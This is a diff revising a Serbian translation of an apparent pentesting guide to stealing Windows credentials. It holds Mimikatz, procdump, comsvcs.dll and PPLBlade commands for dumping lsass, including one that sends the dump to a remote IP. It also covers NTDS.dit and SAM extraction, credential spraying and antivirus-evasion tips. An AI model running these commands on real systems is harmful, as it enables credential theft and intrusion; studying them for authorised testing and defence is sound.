@@ -28,7 +28,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 ## Kredencijali sa Meterpreter-om
 
-Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam napravio da **traži lozinke i hešove** unutar žrtve.
+Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **traži lozinke i hešove** unutar žrtve.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -45,18 +45,22 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-## Bypassing AV
+## Obilaženje AV
 
 ### Procdump + Mimikatz
 
-Kao što je **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**legitiman Microsoft alat**, nije otkriven od strane Defender-a.\
+Kao **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitimni Microsoft alat**, nije otkriven od strane Defender-a.\
 Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **akreditive lokalno** iz dump-a.
+
+Takođe možete koristiti [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -65,9 +69,9 @@ mimikatz # sekurlsa::minidump lsass.dmp
 //Extract credentials
 mimikatz # sekurlsa::logonPasswords
 ```
-Ovaj proces se automatski obavlja pomoću [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Ovaj proces se automatski obavlja sa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe do procdump **umesto** imena **lsass.exe.**
+**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe do procdump **umesto** **imena lsass.exe.**
 
 ### Dumpovanje lsass sa **comsvcs.dll**
 
@@ -86,7 +90,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 1. Desni klik na Task Bar i kliknite na Task Manager
 2. Kliknite na Više detalja
-3. Potražite proces "Local Security Authority Process" na kartici Procesi
+3. Potražite proces "Local Security Authority Process" u kartici Procesi
 4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".
 
 ### Dumpovanje lsass-a pomoću procdump-a
@@ -103,8 +107,8 @@ Get-Process -Name LSASS
 **Ključne funkcionalnosti**:
 
 1. Obilaženje PPL zaštite
-2. Obfusciranje dump fajlova memorije kako bi se izbegle mehanizme detekcije zasnovane na potpisu Defender-a
-3. Učitavanje dump-a memorije sa RAW i SMB metodama bez smeštanja na disk (fileless dump)
+2. Obfusciranje dump fajlova memorije kako bi se izbegle mehanizme detekcije zasnovane na potpisima Defender-a
+3. Učitavanje dump-a memorije sa RAW i SMB metodama bez smeštanja na disk (dump bez fajlova)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -135,7 +139,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 
 Ove datoteke bi trebale biti **locirane** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.
 
-### Iz registra
+### Iz Registra
 
 Najlakši način da se ukradu te datoteke je da se dobije kopija iz registra:
 ```
@@ -194,7 +198,7 @@ Unutar ove baze podataka održavaju se tri glavne tabele:
 
 Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i koristi ga _lsass.exe_. Tada, **deo** fajla **NTDS.dit** može biti lociran **unutar `lsass`** memorije (možete pronaći poslednje pristupne podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).
+Windows koristi _Ntdsa.dll_ za interakciju sa tim fajlom i koristi ga _lsass.exe_. Tada, **deo** fajla **NTDS.dit** može biti lociran **unutar `lsass`** memorije (možete pronaći poslednje pristupne podatke verovatno zbog poboljšanja performansi korišćenjem **cache**).
 
 #### Dešifrovanje hash-ova unutar NTDS.dit
 
@@ -212,7 +216,7 @@ Dostupno od Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-Možete takođe koristiti trik sa [**volume shadow copy**](#stealing-sam-and-system) da kopirate **ntds.dit** datoteku. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa volume shadow copy**](#stealing-sam-and-system)).
+Možete takođe koristiti trik sa [**kopijom senke volumena**](#stealing-sam-and-system) da kopirate datoteku **ntds.dit**. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa kopijom senke volumena**](#stealing-sam-and-system)).
 
 ### **Ekstrakcija hash-ova iz NTDS.dit**
 
@@ -238,7 +242,7 @@ ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 
 ## Lazagne
 
-Preuzmite binarni fajl sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju kredencijala iz nekoliko softvera.
+Preuzmite binarni fajl [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju kredencijala iz nekoliko softvera.
 ```
 lazagne.exe all
 ```
@@ -265,7 +269,7 @@ type outpwdump
 ```
 ### PwDump7
 
-Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i samo **izvršite ga** i lozinke će biti ekstraktovane.
+Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i jednostavno **izvršite ga** i lozinke će biti ekstraktovane.
 
 ## Defenses
 
